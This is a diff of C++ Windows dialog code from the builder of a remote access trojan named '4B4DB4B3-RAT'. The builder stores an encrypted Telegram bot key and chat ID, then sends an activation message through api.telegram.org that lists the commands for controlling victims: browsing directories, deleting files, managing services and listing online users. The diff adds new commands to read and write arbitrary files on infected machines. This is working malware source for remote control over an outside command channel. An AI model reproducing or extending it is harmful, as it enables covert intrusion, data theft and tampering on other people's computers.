@@ -32,7 +32,7 @@ SOFTWARE.
 HWND hWndDlg;
 HBRUSH brDlg = CreateSolidBrush(RGB(37, 37, 38));
 
-INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+INT_PTR DlgProc::DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 	hWndDlg = hWnd;
 	switch (uMsg) {
 		case WM_CTLCOLORDLG:
@@ -79,11 +79,11 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 				}
 				case IDC_STATIC3:
 				{
-					Settings s;
+					Builder::Settings s;
 					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT1), s.botapi, 127);
 					
-					strcpy(s.key, RandomStr(CryptoPP::AES::DEFAULT_KEYLENGTH).c_str());
-					strcpy(s.botapi, EncryptStr(s.botapi, s.key).c_str());
+					strcpy(s.key, Manager::RandomStr(CryptoPP::AES::DEFAULT_KEYLENGTH).c_str());
+					strcpy(s.botapi, Manager::EncryptStr(s.botapi, s.key).c_str());
 
 					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT2), s.chatid, 127);
 
@@ -153,7 +153,7 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT2), chatid, 127);
 					
 					std::string path = "bot" + std::string(api) + "/getUpdates";
-					GetRequest("api.telegram.org", "4B4DB4B3", path.c_str());
+					Requests::GetRequest("api.telegram.org", "4B4DB4B3", path.c_str());
 
 					std::string text = "Hello! 4B4DB4B3-RAT was activated!%0A"
 						"%0A"
@@ -175,6 +175,8 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 
 						"%0AFile manager:%0A"
 						"/user[ID] dir show [C:\\Folder] - show files and folders in directory %0A"
+						"/user[ID] dir read [C:\\Path\\To\\File.txt] - read file %0A"
+						"/user[ID] dir write [C:\\Path\\To\\File.txt] [Text] - write text to a file %0A"
 						"/user[ID] dir del_file C:\\Path\\To\\File.exe - delete file in directory %0A"
 
 						"%0AService manager:%0A"
@@ -202,7 +204,7 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 						"/online - show online users%0A";
 						
 					path = "bot" + std::string(api) + "/sendMessage?chat_id=" + std::string(chatid) + "&text=" + text;
-					GetRequest("api.telegram.org", "B4DB4B3", path.c_str());
+					Requests::GetRequest("api.telegram.org", "B4DB4B3", path.c_str());
 
 					return 0;
 				}
